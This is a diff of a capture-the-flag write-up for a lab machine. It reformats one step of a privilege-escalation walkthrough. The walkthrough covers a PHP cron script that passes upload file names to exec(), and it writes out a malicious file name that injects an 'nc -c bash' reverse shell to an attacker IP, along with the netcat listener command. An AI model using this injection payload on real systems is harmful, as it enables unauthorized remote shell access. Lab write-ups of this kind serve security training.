@@ -155,7 +155,11 @@ foreach ($files as $key => $value) {
 + The **getnameCheck()** function simply separates the name of the file from the extension of the file. The **check_ip()** function checks if the filename is a valid IP address. If it is not, it will return false which will trigger the attack component in the **check_attack.php** file.
 + This passes the path of the file to the **exec()** function and deletes it. Of course, no validation is being done on the input of the **exec()** function and so we can abuse it to escalate privileges.
 + Change to the **/var/www/html/uploads** directory.
-+ Create a file with a file name that contained a **command** that sent a reverse shell back to our machine : `touch '; nc -c bash 10.10.14.21 5555'`
++ Create a file with a file name that contained a **command** that sent a reverse shell back to our machine:
+```
+touch '; nc -c bash 10.10.14.21 5555'
+```
+
 + The **;** will end the **rm** command in the **exec()** function and run the **nc** command, which will send a reverse shell back to our machine.
 + Start netcat listener on the attack machine: `nc -lnvp 5555`
 + Wait three minutes for the cron job to run, and get **guly**'s shell.
